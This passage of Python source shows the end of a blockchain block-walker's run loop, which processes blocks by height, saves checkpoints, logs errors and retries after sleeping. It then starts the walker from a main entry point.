                ok = self.process_block(h)
                if ok:
                    self.save_checkpoint(h)
                    
                    h = random.randint(5000, 450000)
                    # h += 1
                else:
                    logger.warning("block failed; sleeping 15s"); time.sleep(15)
            except KeyboardInterrupt:
                logger.info("Interrupted"); break
            except Exception as e:
                logger.error(f"Error at height {h}: {e}")
                time.sleep(15)

# ---------------------------------------------- entry ----------------------------------------------
if __name__ == "__main__":
    walker = BlockWalker()
    walker.run()
